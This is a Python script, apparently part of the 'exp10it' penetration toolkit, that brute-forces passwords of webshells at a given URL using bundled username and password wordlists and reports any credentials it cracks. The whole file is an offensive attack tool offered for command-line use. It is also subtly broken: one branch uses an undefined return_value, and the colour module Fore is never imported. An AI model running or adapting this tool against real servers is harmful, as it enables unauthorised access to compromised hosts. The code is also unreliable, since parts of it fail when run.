from exp10it import figlet2file
from exp10it import get_webshell_suffix_type
from exp10it import check_webshell_url
from exp10it import get_http_domain_from_url
from exp10it import crack_allext_biaodan_webshell_url
from exp10it import crack_ext_direct_webshell_url
from exp10it import ModulePath

def crack_webshell(url, anyway=0):
    # webshll爆破,第二个参数默认为0,如果设置不为0,则不考虑判断是否是webshll,如果设置为1,直接按direct_bao方式爆破
    # 如果设置为2,直接按biaodan_bao方式爆破

    figlet2file("cracking webshell", 0, True)
    print("cracking webshell --> %s" % url)
    print("正在使用吃奶的劲爆破...")

    ext = get_webshell_suffix_type(url)
    tmp = check_webshell_url(url)
    url_http_domain = get_http_domain_from_url(url)
    if tmp['y2'] == 'direct_bao' or tmp['y2'] == 'biaodan_bao':
        pass

    if anyway == 1 or tmp['y2'] == "direct_bao":
        return_value = crack_ext_direct_webshell_url(
            url, ModulePath + "dicts/webshell_passwords.txt", ext)
        if return_value['cracked'] == 0:
            print("webshell爆破失败 :(")
            return ""
        else:
            # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应非urls表
            # 中的cracked_webshell_urls_info字段中
            strings_to_write = "webshell:%s,password:%s" % (
                url, return_value['password'])
    elif anyway == 2 or tmp['y2'] == "biaodan_bao":
        return_value = crack_allext_biaodan_webshell_url(
            url, ModulePath + "dicts/user.txt", ModulePath + "dicts/webshell_passwords.txt")
        if return_value['cracked'] == 0:
            print("webshell爆破失败 :(")
            return ""
        else:
            # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应表中的
            # cracked_webshell_urls_info字段中
            strings_to_write = "webshell:%s,password:%s" % (
                url, return_value['password'])

    elif tmp['y2'] == "bypass":
        print(
            Fore.RED +
            "congratulations!!! webshell may found and has no password!!!")
        string = "cracked webshell:%s no password!!!" % url
        print(Fore.RED + string)

        # 爆破成功将cracked_webshell_url_info标记为webshell密码信息,并将webshell密码信息加入到相应表中的
        # cracked_webshell_urls_info字段中
        strings_to_write = "webshell:%s,password:%s" % (
            url, return_value['password'])
    else:
        strings_to_write="这不是一个webshell :("

    return strings_to_write

if __name__=="__main__":
    import sys
    webshellUrl=sys.argv[1]
    crack_webshell(webshellUrl)

